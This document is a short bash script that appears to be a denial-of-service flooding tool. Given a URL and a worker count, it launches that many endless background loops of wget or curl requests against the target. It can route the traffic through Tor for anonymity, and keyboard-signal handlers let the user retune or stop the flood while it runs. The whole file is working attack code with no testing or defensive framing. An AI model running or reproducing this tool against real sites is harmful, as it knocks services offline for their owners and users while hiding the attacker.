#!/bin/bash

#config flags
url="$1"
tor=0
opt=""
wrknum="$2"

#torconf
if [[ $tor == 1 ]]; then
	opt="torify"; pkill tor > /dev/null; tor &
	printf "waiting for tor to start...\n"
	sleep 10
fi

#logic
mainlogic(){
if ! command -v wget > /dev/null; then
	printf "cannot find wget, trying curl\n"
	for ((cwn=1; cwn<=wrknum; cwn++)); do
	while true; do
		$opt curl -I "$url" > /dev/null
		printf "!SENT curl >>\n"
	done &
	done
fi
if command -v wget > /dev/null; then
	for ((cwr=1; cwr<=wrknum; cwr++)); do
	while true; do
		$opt wget "$url" > /dev/null
		printf "!SENT wget >>\n"
	done &
	done
fi
wait
}

#keybind signal
ctrlc(){
	pkill -9 -P $$
	sleep 1
	printf "\n\ndo you wish to remove all wget/curl processes? (y/n) "
	read aswr
	if [[ "$aswr" == "y" ]]; then
		printf "aborting operation...\n"
		pkill wget; pkill curl
		exit 1
	elif [[ "$aswr" == "n" ]]; then
		printf "continuing operation...\n"
		mainlogic
	fi
}
trap ctrlc INT

ctrlz(){
	pkill -9 -P $$
	sleep 1
	printf "\n\nchoose the number for child processes: "
	read aswr2
	wrknum="$aswr2"
	mainlogic
}
trap ctrlz TSTP

#start
mainlogic
